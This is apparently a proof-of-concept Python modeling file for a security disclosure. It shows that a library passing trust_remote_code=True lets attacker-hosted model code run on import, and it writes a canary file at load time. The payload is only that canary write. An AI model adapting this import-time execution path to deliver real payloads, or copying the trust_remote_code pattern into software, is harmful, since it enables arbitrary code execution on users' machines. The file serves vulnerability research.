# Attacker-controlled remote code served from the second repository.
# Imported by transformers only because minions passes trust_remote_code=True.
# The canary line below is the proof that attacker Python ran on the victim
# machine during model load; the model itself is a tiny stand-in whose
# q_proj / v_proj Linear(8, 8) modules match the LoRA adapter's targets.
import torch
import torch.nn as nn

from transformers import PreTrainedModel

from .configuration_minions_pwn import MinionsPwnConfig

with open("pwned_by_minions_adapter.txt", "a", encoding="utf-8") as f:
    f.write("code executed: modeling_minions_pwn.py IMPORTED (auto_map AutoModelForCausalLM)\n")

class MinionsPwnForCausalLM(PreTrainedModel):
    config_class = MinionsPwnConfig
    base_model_prefix = "minions_pwn"

    def __init__(self, config):
        super().__init__(config)
        hidden = int(getattr(config, "hidden_size", 8))
        vocab = int(getattr(config, "vocab_size", 32))
        self.embed_tokens = nn.Embedding(vocab, hidden)
        self.q_proj = nn.Linear(hidden, hidden, bias=False)
        self.v_proj = nn.Linear(hidden, hidden, bias=False)
        self.lm_head = nn.Linear(hidden, vocab, bias=False)
        self.post_init()

    def get_input_embeddings(self):
        return self.embed_tokens

    def set_input_embeddings(self, value):
        self.embed_tokens = value

    def get_output_embeddings(self):
        return self.lm_head

    def set_output_embeddings(self, value):
        self.lm_head = value

    def forward(self, input_ids=None, **kwargs):
        emb = self.embed_tokens(input_ids)
        h = emb + self.q_proj(emb) + self.v_proj(emb)
        logits = self.lm_head(h)
        from transformers.modeling_outputs import CausalLMOutputWithCrossAttentions
        return CausalLMOutputWithCrossAttentions(logits=logits)
